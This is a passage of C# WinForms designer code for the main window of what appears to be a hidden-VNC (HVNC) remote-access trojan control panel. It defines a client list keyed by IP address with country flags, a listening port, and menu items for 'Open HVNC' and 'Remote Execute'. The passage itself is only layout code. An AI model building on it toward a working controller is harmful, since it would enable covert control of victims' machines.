      this.imageList1.Images.SetKeyName(100, "hu.png");
      this.imageList1.Images.SetKeyName(101, "id.png");
      this.imageList1.Images.SetKeyName(102, "ie.png");
      this.imageList1.Images.SetKeyName(103, "il.png");
      this.imageList1.Images.SetKeyName(104, "in.png");
      this.imageList1.Images.SetKeyName(105, "io.png");
      this.imageList1.Images.SetKeyName(106, "iq.png");
      this.imageList1.Images.SetKeyName(107, "ir.png");
      this.imageList1.Images.SetKeyName(108, "is.png");
      this.imageList1.Images.SetKeyName(109, "it.png");
      this.imageList1.Images.SetKeyName(110, "jm.png");
      this.imageList1.Images.SetKeyName(111, "jo.png");
      this.imageList1.Images.SetKeyName(112, "jp.png");
      this.imageList1.Images.SetKeyName(113, "ke.png");
      this.imageList1.Images.SetKeyName(114, "kg.png");
      this.imageList1.Images.SetKeyName(115, "kh.png");
      this.imageList1.Images.SetKeyName(116, "ki.png");
      this.imageList1.Images.SetKeyName(117, "km.png");
      this.imageList1.Images.SetKeyName(118, "kn.png");
      this.imageList1.Images.SetKeyName(119, "kp.png");
      this.imageList1.Images.SetKeyName(120, "kr.png");
      this.imageList1.Images.SetKeyName(121, "kw.png");
      this.imageList1.Images.SetKeyName(122, "ky.png");
      this.imageList1.Images.SetKeyName(123, "kz.png");
      this.imageList1.Images.SetKeyName(124, "la.png");
      this.imageList1.Images.SetKeyName(125, "lb.png");
      this.imageList1.Images.SetKeyName(126, "lc.png");
      this.imageList1.Images.SetKeyName((int) sbyte.MaxValue, "li.png");
      this.imageList1.Images.SetKeyName(128, "lk.png");
      this.imageList1.Images.SetKeyName(129, "lr.png");
      this.imageList1.Images.SetKeyName(130, "ls.png");
      this.imageList1.Images.SetKeyName(131, "lt.png");
      this.imageList1.Images.SetKeyName(132, "lu.png");
      this.imageList1.Images.SetKeyName(133, "lv.png");
      this.imageList1.Images.SetKeyName(134, "ly.png");
      this.imageList1.Images.SetKeyName(135, "ma.png");
      this.imageList1.Images.SetKeyName(136, "mc.png");
      this.imageList1.Images.SetKeyName(137, "md.png");
      this.imageList1.Images.SetKeyName(138, "me.png");
      this.imageList1.Images.SetKeyName(139, "mg.png");
      this.imageList1.Images.SetKeyName(140, "mh.png");
      this.imageList1.Images.SetKeyName(141, "mk.png");
      this.imageList1.Images.SetKeyName(142, "ml.png");
      this.imageList1.Images.SetKeyName(143, "mm.png");
      this.imageList1.Images.SetKeyName(144, "mn.png");
      this.imageList1.Images.SetKeyName(145, "mo.png");
      this.imageList1.Images.SetKeyName(146, "mp.png");
      this.imageList1.Images.SetKeyName(147, "mq.png");
      this.imageList1.Images.SetKeyName(148, "mr.png");
      this.imageList1.Images.SetKeyName(149, "ms.png");
      this.imageList1.Images.SetKeyName(150, "mt.png");
      this.imageList1.Images.SetKeyName(151, "mu.png");
      this.imageList1.Images.SetKeyName(152, "mv.png");
      this.imageList1.Images.SetKeyName(153, "mw.png");
      this.imageList1.Images.SetKeyName(154, "mx.png");
      this.imageList1.Images.SetKeyName(155, "my.png");
      this.imageList1.Images.SetKeyName(156, "mz.png");
      this.imageList1.Images.SetKeyName(157, "na.png");
      this.imageList1.Images.SetKeyName(158, "nc.png");
      this.imageList1.Images.SetKeyName(159, "ne.png");
      this.imageList1.Images.SetKeyName(160, "nf.png");
      this.imageList1.Images.SetKeyName(161, "ng.png");
      this.imageList1.Images.SetKeyName(162, "ni.png");
      this.imageList1.Images.SetKeyName(163, "nl.png");
      this.imageList1.Images.SetKeyName(164, "no.png");
      this.imageList1.Images.SetKeyName(165, "np.png");
      this.imageList1.Images.SetKeyName(166, "nr.png");
      this.imageList1.Images.SetKeyName(167, "nu.png");
      this.imageList1.Images.SetKeyName(168, "nz.png");
      this.imageList1.Images.SetKeyName(169, "om.png");
      this.imageList1.Images.SetKeyName(170, "pa.png");
      this.imageList1.Images.SetKeyName(171, "pe.png");
      this.imageList1.Images.SetKeyName(172, "pf.png");
      this.imageList1.Images.SetKeyName(173, "pg.png");
      this.imageList1.Images.SetKeyName(174, "ph.png");
      this.imageList1.Images.SetKeyName(175, "pk.png");
      this.imageList1.Images.SetKeyName(176, "pl.png");
      this.imageList1.Images.SetKeyName(177, "pm.png");
      this.imageList1.Images.SetKeyName(178, "pn.png");
      this.imageList1.Images.SetKeyName(179, "pr.png");
      this.imageList1.Images.SetKeyName(180, "ps.png");
      this.imageList1.Images.SetKeyName(181, "pt.png");
      this.imageList1.Images.SetKeyName(182, "pw.png");
      this.imageList1.Images.SetKeyName(183, "py.png");
      this.imageList1.Images.SetKeyName(184, "qa.png");
      this.imageList1.Images.SetKeyName(185, "re.png");
      this.imageList1.Images.SetKeyName(186, "ro.png");
      this.imageList1.Images.SetKeyName(187, "rs.png");
      this.imageList1.Images.SetKeyName(188, "ru.png");
      this.imageList1.Images.SetKeyName(189, "rw.png");
      this.imageList1.Images.SetKeyName(190, "sa.png");
      this.imageList1.Images.SetKeyName(191, "sb.png");
      this.imageList1.Images.SetKeyName(192, "sc.png");
      this.imageList1.Images.SetKeyName(193, "scotland.png");
      this.imageList1.Images.SetKeyName(194, "sd.png");
      this.imageList1.Images.SetKeyName(195, "se.png");
      this.imageList1.Images.SetKeyName(196, "sg.png");
      this.imageList1.Images.SetKeyName(197, "sh.png");
      this.imageList1.Images.SetKeyName(198, "si.png");
      this.imageList1.Images.SetKeyName(199, "sj.png");
      this.imageList1.Images.SetKeyName(200, "sk.png");
      this.imageList1.Images.SetKeyName(201, "sl.png");
      this.imageList1.Images.SetKeyName(202, "sm.png");
      this.imageList1.Images.SetKeyName(203, "sn.png");
      this.imageList1.Images.SetKeyName(204, "so.png");
      this.imageList1.Images.SetKeyName(205, "sr.png");
      this.imageList1.Images.SetKeyName(206, "st.png");
      this.imageList1.Images.SetKeyName(207, "sv.png");
      this.imageList1.Images.SetKeyName(208, "sy.png");
      this.imageList1.Images.SetKeyName(209, "sz.png");
      this.imageList1.Images.SetKeyName(210, "tc.png");
      this.imageList1.Images.SetKeyName(211, "td.png");
      this.imageList1.Images.SetKeyName(212, "tf.png");
      this.imageList1.Images.SetKeyName(213, "tg.png");
      this.imageList1.Images.SetKeyName(214, "th.png");
      this.imageList1.Images.SetKeyName(215, "tj.png");
      this.imageList1.Images.SetKeyName(216, "tk.png");
      this.imageList1.Images.SetKeyName(217, "tl.png");
      this.imageList1.Images.SetKeyName(218, "tm.png");
      this.imageList1.Images.SetKeyName(219, "tn.png");
      this.imageList1.Images.SetKeyName(220, "to.png");
      this.imageList1.Images.SetKeyName(221, "tr.png");
      this.imageList1.Images.SetKeyName(222, "tt.png");
      this.imageList1.Images.SetKeyName(223, "tv.png");
      this.imageList1.Images.SetKeyName(224, "tw.png");
      this.imageList1.Images.SetKeyName(225, "tz.png");
      this.imageList1.Images.SetKeyName(226, "ua.png");
      this.imageList1.Images.SetKeyName(227, "ug.png");
      this.imageList1.Images.SetKeyName(228, "um.png");
      this.imageList1.Images.SetKeyName(229, "us.png");
      this.imageList1.Images.SetKeyName(230, "uy.png");
      this.imageList1.Images.SetKeyName(231, "uz.png");
      this.imageList1.Images.SetKeyName(232, "va.png");
      this.imageList1.Images.SetKeyName(233, "vc.png");
      this.imageList1.Images.SetKeyName(234, "ve.png");
      this.imageList1.Images.SetKeyName(235, "vg.png");
      this.imageList1.Images.SetKeyName(236, "vi.png");
      this.imageList1.Images.SetKeyName(237, "vn.png");
      this.imageList1.Images.SetKeyName(238, "vu.png");
      this.imageList1.Images.SetKeyName(239, "wales.png");
      this.imageList1.Images.SetKeyName(240, "wf.png");
      this.imageList1.Images.SetKeyName(241, "ws.png");
      this.imageList1.Images.SetKeyName(242, "ye.png");
      this.imageList1.Images.SetKeyName(243, "yt.png");
      this.imageList1.Images.SetKeyName(244, "za.png");
      this.imageList1.Images.SetKeyName(245, "zm.png");
      this.imageList1.Images.SetKeyName(246, "zw.png");
      this.contextMenuStrip1.Font = new Font("Segoe UI", 9.75f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.contextMenuStrip1.ImageScalingSize = new Size(25, 25);
      this.contextMenuStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.testToolStripMenuItem,
        //(ToolStripItem) this.builderToolStripMenuItem,
        (ToolStripItem) this.optionsToolStripMenuItem
      });
         
            this.contextMenuStrip1.Name = "contextMenuStrip1";
      this.contextMenuStrip1.RenderMode = ToolStripRenderMode.System;
      this.contextMenuStrip1.Size = new Size(165, 100);
      this.testToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("testToolStripMenuItem.Image");
      this.testToolStripMenuItem.Name = "testToolStripMenuItem";
      this.testToolStripMenuItem.Size = new Size(164, 32);
      this.testToolStripMenuItem.Text = "Open HVNC";
      this.testToolStripMenuItem.Click += new EventHandler(this.HVNCList_DoubleClick);
      //this.builderToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("builderToolStripMenuItem.Image");
      //this.builderToolStripMenuItem.Name = "builderToolStripMenuItem";
      //this.builderToolStripMenuItem.Size = new Size(164, 32);
      //this.builderToolStripMenuItem.Text = "Builder";
      //this.builderToolStripMenuItem.Click += new EventHandler(this.builderToolStripMenuItem_Click);
      this.optionsToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.remoteExecuteToolStripMenuItem,
        (ToolStripItem) this.closeConnectionToolStripMenuItem
      });
      this.optionsToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("optionsToolStripMenuItem.Image");
      this.optionsToolStripMenuItem.Name = "optionsToolStripMenuItem";
      this.optionsToolStripMenuItem.Size = new Size(164, 32);
      this.optionsToolStripMenuItem.Text = "Options";
      this.remoteExecuteToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("remoteExecuteToolStripMenuItem.Image");
      this.remoteExecuteToolStripMenuItem.Name = "remoteExecuteToolStripMenuItem";
      this.remoteExecuteToolStripMenuItem.Size = new Size(186, 32);
      this.remoteExecuteToolStripMenuItem.Text = "Remote Execute";
      this.remoteExecuteToolStripMenuItem.Click += new EventHandler(this.remoteExecuteToolStripMenuItem_Click);
      this.closeConnectionToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("closeConnectionToolStripMenuItem.Image");
      this.closeConnectionToolStripMenuItem.Name = "closeConnectionToolStripMenuItem";
      this.closeConnectionToolStripMenuItem.Size = new Size(186, 32);
      this.closeConnectionToolStripMenuItem.Text = "Close Connection";
      this.closeConnectionToolStripMenuItem.Click += new EventHandler(this.closeConnectionToolStripMenuItem_Click);
      this.panel1.BackColor = Color.FromArgb(27, 27, 27);
      this.panel1.Controls.Add((Control) this.siticoneControlBox3);
      this.panel1.Controls.Add((Control) this.pictureBox1);
      this.panel1.Controls.Add((Control) this.label3);
      this.panel1.Dock = DockStyle.Top;
      this.panel1.Location = new Point(0, 0);
      this.panel1.Name = "panel1";
      this.panel1.Size = new Size(1088, 36);
      this.panel1.TabIndex = 2;
      this.siticoneControlBox3.Anchor = AnchorStyles.Top | AnchorStyles.Right;
      this.siticoneControlBox3.FillColor = Color.Transparent;
      this.siticoneControlBox3.HoverState.Parent = this.siticoneControlBox3;
      this.siticoneControlBox3.IconColor = Color.White;
      this.siticoneControlBox3.Location = new Point(1058, 3);
      this.siticoneControlBox3.Name = "siticoneControlBox3";
      this.siticoneControlBox3.ShadowDecoration.Parent = (Control) this.siticoneControlBox3;
      this.siticoneControlBox3.Size = new Size(30, 30);
      this.siticoneControlBox3.TabIndex = 149;
      this.pictureBox1.Enabled = false;
      this.pictureBox1.Image = (Image) componentResourceManager.GetObject("pictureBox1.Image");
      this.pictureBox1.Location = new Point(0, 0);
      this.pictureBox1.Name = "pictureBox1";
      this.pictureBox1.Size = new Size(34, 32);
      this.pictureBox1.SizeMode = PictureBoxSizeMode.StretchImage;
      this.pictureBox1.TabIndex = 144;
      this.pictureBox1.TabStop = false;
      this.label3.AutoSize = true;
      this.label3.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.label3.ForeColor = Color.Gainsboro;
      this.label3.Location = new Point(38, 8);
      this.label3.Name = "label3";
      this.label3.Size = new Size(54, 20);
      this.label3.TabIndex = 5;
      this.label3.Text = "HVNC";
      this.PortStatus.AutoSize = true;
      this.PortStatus.BackColor = Color.Transparent;
      this.PortStatus.ForeColor = Color.White;
      this.PortStatus.Location = new Point(868, 8);
      this.PortStatus.Name = "PortStatus";
      this.PortStatus.Size = new Size(71, 13);
      this.PortStatus.TabIndex = 146;
      this.PortStatus.Text = "Listening Port";
      this.PortStatus.Visible = false;
      this.imageList2.ImageStream = (ImageListStreamer) componentResourceManager.GetObject("imageList2.ImageStream");
      this.imageList2.TransparentColor = Color.Transparent;
      this.imageList2.Images.SetKeyName(0, "connected_480px.png");
      this.imageList2.Images.SetKeyName(1, "disconnected_480px.png");
      this.HVNCList.Activation = ItemActivation.OneClick;
      this.HVNCList.BackColor = Color.FromArgb(27, 27, 27);
      this.HVNCList.BorderStyle = BorderStyle.None;
      this.HVNCList.Columns.AddRange(new ColumnHeader[2]
      {
        this.columnHeader3,
        this.columnHeader1
      });
      this.HVNCList.ContextMenuStrip = this.contextMenuStrip1;
      this.HVNCList.Dock = DockStyle.Fill;
      this.HVNCList.ForeColor = Color.Transparent;
      this.HVNCList.FullRowSelect = true;
      this.HVNCList.HideSelection = false;
      this.HVNCList.LabelEdit = true;
      this.HVNCList.Location = new Point(0, 67);
      this.HVNCList.Name = "HVNCList";
      this.HVNCList.Size = new Size(1088, 514);
      this.HVNCList.SmallImageList = this.imageList1;
      this.HVNCList.TabIndex = 7;
      this.HVNCList.UseCompatibleStateImageBehavior = false;
      this.HVNCList.View = View.Details;
      this.columnHeader3.Text = "IP Address";
      this.columnHeader3.Width = 150;
      this.columnHeader1.Text = "";
      this.columnHeader1.Width = 938;
      this.HVNCListenBtn.BackgroundImageLayout = ImageLayout.None;
      this.HVNCListenBtn.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.portToolStripMenuItem,
        (ToolStripItem) this.HVNCListenPort,
        (ToolStripItem) this.toolStripSeparator3
      });
      this.HVNCListenBtn.Image = (Image) componentResourceManager.GetObject("HVNCListenBtn.Image");
      this.HVNCListenBtn.Name = "HVNCListenBtn";
      this.HVNCListenBtn.Size = new Size(189, 32);
      this.HVNCListenBtn.Text = "listening Port";
      this.HVNCListenBtn.Click += new EventHandler(this.HVNCListenBtn_Click_1);
      this.portToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("portToolStripMenuItem.Image");
      this.portToolStripMenuItem.Name = "portToolStripMenuItem";
      this.portToolStripMenuItem.Size = new Size(160, 22);
      this.portToolStripMenuItem.Text = "Port :";
      this.HVNCListenPort.Font = new Font("Segoe UI", 9f);
      this.HVNCListenPort.Name = "HVNCListenPort";
      this.HVNCListenPort.Size = new Size(100, 23);
      this.HVNCListenPort.Text = "9031";
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(157, 6);

      this.siticoneGradientPanel4.BackColor = Color.FromArgb(27, 27, 27);
           
      this.siticoneGradientPanel4.Controls.Add((Control)this.ClientsOnline);
      ///      this.siticoneGradientPanel4.Controls.Add((Control) this.hvncport);
      //this.siticoneGradientPanel4.Controls.Add((Control) this.TogglePort);
     // this.siticoneGradientPanel4.Controls.Add((Control) this.PortStatus);
      this.siticoneGradientPanel4.Dock = DockStyle.Top;
      this.siticoneGradientPanel4.FillColor = Color.FromArgb(100 ,36 , 28);
      this.siticoneGradientPanel4.FillColor2 = Color.FromArgb(100, 36, 28);//Color.FromArgb(27, 27, 27);
            this.siticoneGradientPanel4.Location = new Point(0, 36);
      this.siticoneGradientPanel4.Name = "siticoneGradientPanel4";
      this.siticoneGradientPanel4.ShadowDecoration.Parent = (Control) this.siticoneGradientPanel4;
      //this.siticoneGradientPanel4.Size = new Size(1088, 31);
      this.siticoneGradientPanel4.Size = new Size(1088, 24);
            this.siticoneGradientPanel4.TabIndex = 157;
      this.hvncport.BackColor = Color.Transparent;
      this.hvncport.BorderColor = Color.FromArgb(92 ,36 , 28);
      this.hvncport.Cursor = Cursors.IBeam;
      this.hvncport.DisabledState.Parent = this.hvncport;
      this.hvncport.FillColor = Color.FromArgb(27, 27, 27);
      this.hvncport.FocusedState.Parent = this.hvncport;
      this.hvncport.Font = new Font("Segoe UI", 9f);
      this.hvncport.ForeColor = Color.Gainsboro;
      this.hvncport.Location = new Point(1002, 3);
      this.hvncport.Maximum = new Decimal(new int[4]
      {
        (int) ushort.MaxValue,
        0,
        0,
        0
      });
      this.hvncport.Minimum = new Decimal(new int[4]
      {
        1024,
        0,
        0,
        0
      });
      this.hvncport.Name = "hvncport";
      this.hvncport.ShadowDecoration.Parent = (Control) this.hvncport;
      this.hvncport.Size = new Size(83, 25);
      this.hvncport.TabIndex = 162;
      this.hvncport.UpDownButtonFillColor = Color.FromArgb(92 ,36 , 28);
      this.hvncport.UpDownButtonForeColor = Color.Gainsboro;
      this.hvncport.Value = new Decimal(new int[4]
      {
        5050,
        0,
        0,
        0
      });
      this.TogglePort.Anchor = AnchorStyles.Top;
      this.TogglePort.BackColor = Color.Transparent;
      this.TogglePort.CheckedState.BorderColor = Color.Transparent;
      this.TogglePort.CheckedState.FillColor = Color.Transparent;
      this.TogglePort.CheckedState.InnerBorderColor = Color.White;
      this.TogglePort.CheckedState.InnerBorderThickness = 2;
      this.TogglePort.CheckedState.InnerColor = Color.FromArgb(243, 30, 30);
      this.TogglePort.CheckedState.Parent = this.TogglePort;
      this.TogglePort.Location = new Point(945, 5);
      this.TogglePort.Name = "TogglePort";
      this.TogglePort.ShadowDecoration.Parent = (Control) this.TogglePort;
      this.TogglePort.Size = new Size(39, 20);
      this.TogglePort.TabIndex = 157;
      this.TogglePort.UncheckedState.BorderColor = Color.Transparent;
      this.TogglePort.UncheckedState.FillColor = Color.Transparent;
      this.TogglePort.UncheckedState.InnerBorderColor = Color.White;
      this.TogglePort.UncheckedState.InnerColor = Color.FromArgb(243, 30, 30);
      this.TogglePort.UncheckedState.Parent = this.TogglePort;
      this.TogglePort.CheckedChanged += new EventHandler(this.TogglePort_Click);
      this.siticoneBorderlessForm1.ContainerControl = (ContainerControl) this;
      this.siticoneBorderlessForm1.ShadowColor = Color.FromArgb(243, 30, 30);
      this.siticoneDragControl1.TargetControl = (Control) this.panel1;
      this.siticoneGradientPanel1.BackColor = Color.FromArgb(27, 27, 27);

            // this.siticoneGradientPanel1.Controls.Add((Control) this.ClientsOnline);
      this.siticoneGradientPanel1.Controls.Add((Control) this.hvncport);
      this.siticoneGradientPanel1.Controls.Add((Control) this.TogglePort);
      this.siticoneGradientPanel1.Controls.Add((Control) this.PortStatus);
            this.siticoneGradientPanel1.Dock = DockStyle.Bottom;
      this.siticoneGradientPanel1.FillColor = Color.FromArgb(27 ,27 , 255);//Color.FromArgb(27, 27, 27);
            this.siticoneGradientPanel1.FillColor2 = Color.FromArgb(27 ,27 , 255);
      this.siticoneGradientPanel1.Location = new Point(0, 581);
      this.siticoneGradientPanel1.Name = "siticoneGradientPanel1";
      this.siticoneGradientPanel1.ShadowDecoration.Parent = (Control) this.siticoneGradientPanel1;
      //this.siticoneGradientPanel1.Size = new Size(1088, 24);
      this.siticoneGradientPanel1.Size = new Size(1088, 31);
      this.siticoneGradientPanel1.TabIndex = 158;
      this.ClientsOnline.AutoSize = true;
      this.ClientsOnline.BackColor = Color.Transparent;
      this.ClientsOnline.Font = new Font("Microsoft Sans Serif", 9f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.ClientsOnline.ForeColor = Color.Gainsboro;
      this.ClientsOnline.Location = new Point(2, 4);
      this.ClientsOnline.Name = "ClientsOnline";
      this.ClientsOnline.Size = new Size(132, 15);
      this.ClientsOnline.TabIndex = 5;
      this.ClientsOnline.Text = "Client in HVNC Panel 0";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(24, 24, 24);
      this.ClientSize = new Size(1088, 605);
      this.ContextMenuStrip = this.contextMenuStrip1;
      this.Controls.Add((Control) this.HVNCList);
      this.Controls.Add((Control) this.siticoneGradientPanel4);
      this.Controls.Add((Control) this.panel1);
      this.Controls.Add((Control) this.siticoneGradientPanel1);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MinimumSize = new Size(1040, 521);
      this.Name = nameof (FrmMain);
      this.Opacity = 0.97;
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "HVNC";
      this.TransparencyKey = Color.FromArgb(0, 0, 9, 19);
      this.FormClosing += new FormClosingEventHandler(this.FrmMain_FormClosing);
      this.FormClosed += new FormClosedEventHandler(this.FrmMain_FormClosed);
      this.Load += new EventHandler(this.FrmMain_Load);
      this.contextMenuStrip1.ResumeLayout(false);
      this.panel1.ResumeLayout(false);
      this.panel1.PerformLayout();

     
            ((ISupportInitialize) this.pictureBox1).EndInit();
      this.siticoneGradientPanel4.ResumeLayout(false);
      this.siticoneGradientPanel4.PerformLayout();
      this.hvncport.EndInit();
      this.siticoneGradientPanel1.ResumeLayout(false);
      this.siticoneGradientPanel1.PerformLayout();
      this.ResumeLayout(false);
    }
  }
}
